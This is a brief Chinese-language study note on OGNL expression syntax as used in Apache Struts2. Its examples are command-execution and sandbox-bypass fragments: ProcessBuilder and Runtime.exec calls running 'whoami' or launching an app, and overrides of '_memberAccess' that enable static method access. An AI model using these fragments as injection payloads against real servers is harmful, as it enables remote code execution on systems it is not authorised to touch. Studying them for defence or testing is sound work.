### 0419_语法结构

```js
// 创建实例
%{#a = new 全限定类名(params...)}

// eg
%{#a=new java.io.File("/home/frank/")}
```

```js
// 创建实例并调用方法
%{(new 全限定类名(params...)).类方法(params...)}
%{#a = (new 全限定类名(params...)).类方法(params...)}

// 创建实例并获取属性
%{(new 全限定类名(params...)).类属性}
%{#a = (new 全限定类名(params...)).类属性}

// eg
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "whoami"})).start()}
```

```js
// 静态方法
%{@全限定类名@静态方法(params...)}
%{@全限定类名@静态方法(params...).类方法(params...)}

// 静态属性
%{@全限定类名@静态属性}
%{#a = @全限定类名@静态属性}

// eg
%{@java.lang.ClassLoader@getSystemClassLoader()}
%{@java.lang.System@getProperty("os.name")}
%{@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app/")}
%{#ognlUtil= #container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)}
%{#_memberAccess = @ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}
```

```js
// 新建 list
%{new 全限定类名[]{elements...}}
// ???
%{#a = new 基本类型[]}

// eg
%{new java.lang.String[]{"/bin/bash", "-c", "whoami"}}
%{#e = new char[50000]}
```

```js
// 获取属性
%{#a[属性名]}
%{#a.属性名}

// eg
%{#_memberAccess.allowStaticMethodAccess = true}
%{#_memberAccess.allowStaticMethodAccess = new java.lang.Boolean(true)}
%{#_memberAccess["allowStaticMethodAccess"]=true}
```
